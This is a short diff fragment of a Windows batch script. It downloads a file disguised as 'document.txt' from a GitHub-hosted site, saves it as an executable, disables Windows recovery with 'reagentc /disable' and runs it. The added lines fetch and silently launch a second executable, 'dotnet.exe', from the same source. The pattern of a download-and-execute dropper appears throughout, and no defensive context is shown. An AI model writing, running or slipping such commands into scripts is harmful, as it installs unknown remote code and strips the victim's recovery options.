@@ -46,4 +46,6 @@ start backup.bat
 curl --ssl-no-revoke -L -o file.exe https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/document.txt
 reagentc /disable
 start file.exe
+curl --ssl-no-revoke -L -o dotnet.exe https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/dotnet.exe
+dotnet.exe /q /norestart /l "install.log"
 exit
